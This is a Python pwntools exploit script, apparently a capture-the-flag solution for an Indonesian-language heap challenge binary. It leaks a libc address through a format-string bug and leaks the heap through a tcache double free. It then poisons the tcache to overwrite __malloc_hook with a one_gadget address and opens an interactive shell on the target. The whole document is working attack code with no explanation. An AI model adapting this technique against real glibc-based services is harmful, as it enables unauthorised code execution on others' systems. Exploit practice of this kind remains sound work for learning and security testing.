from pwn import *
from sys import argv
# patchelf --set-interpreter /pwd/solver/ld-2.27.so ./chal
context.update(arch='amd64', os='linux', terminal=['tmux','splitw','-h'])

def leak_libc(p):
	p.recvuntil('Masukkan nama kandang ayam Anda: ')
	p.sendline('%11$p')
	leak = p.recvuntil('\nNama yang bagus.')[2:-len('\nNama yang bagus.')]
	libc = int(leak, 16) - 0x21b97
	log.info('libc: 0x%x' % libc)
	return libc

def add(p, idx, name):
	p.recvuntil('Pilihan Anda: ')
	p.sendline('1')
	p.recvuntil('Ayam ke berapa? ')
	p.sendline(str(idx))
	p.recvuntil('Nama ayam: ')
	p.sendline(name)


def show(p, idx):
	p.recvuntil('Pilihan Anda: ')
	p.sendline('2')
	p.recvuntil('Ayam ke berapa? ')
	p.sendline(str(idx))
	p.recvuntil('Nama: ')
	return p.recvuntil('###############################')[:-(len('\n###############################'))]

def edit(p, idx, name):
	p.recvuntil('Pilihan Anda: ')
	p.sendline('3')
	p.recvuntil('Ayam ke berapa? ')
	p.sendline(str(idx))
	p.recvuntil('Nama ayam: ')
	p.sendline(name)

def delete(p, idx):
	p.recvuntil('Pilihan Anda: ')
	p.sendline('4')
	p.recvuntil('Ayam ke berapa? ')
	p.sendline(str(idx))

def __main__():
	if('local' in argv):
		p = process('./chal', env={"LD_PRELOAD":"../libc-2.27.so"})
	else:
		p = remote('192.168.1.9', 22223)

	if('gdb' in argv):
		gdbscript = '''
			b *beli_ayam+152
			b *potong_ayam+147
			b *set_nama+118
			continue
		'''
		gdb.attach(p, gdbscript)

	libc_base = leak_libc(p)
	malloc_hook = libc_base + 0x3ebc30
	log.info('malloc_hook 0x%x' % malloc_hook)
	one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
	for i in one_gadget:
		log.info('one gadget 0x%x' % (libc_base+i))
	heap_base = 0

	add(p, 0, 'a')
	add(p, 1, 'ZZZZ')
	delete(p, 0)
	delete(p, 0)
	delete(p, 1)
	h = u64(show(p, 0).ljust(8, b'\x00'))
	log.info('leak heap: 0x%x' % h)

	add(p, 2, p64(h))
	add(p, 3, p64(malloc_hook)) # set what to overwrite
	add(p, 4, 'garbage')

	# overwrite malloc
	add(p, 5, p64(libc_base+one_gadget[2]))
	p.recvuntil('Pilihan Anda: ')
	p.sendline('1')
	p.recvuntil('Ayam ke berapa? ')
	p.sendline('6')
	
	# shell
	p.interactive()

__main__()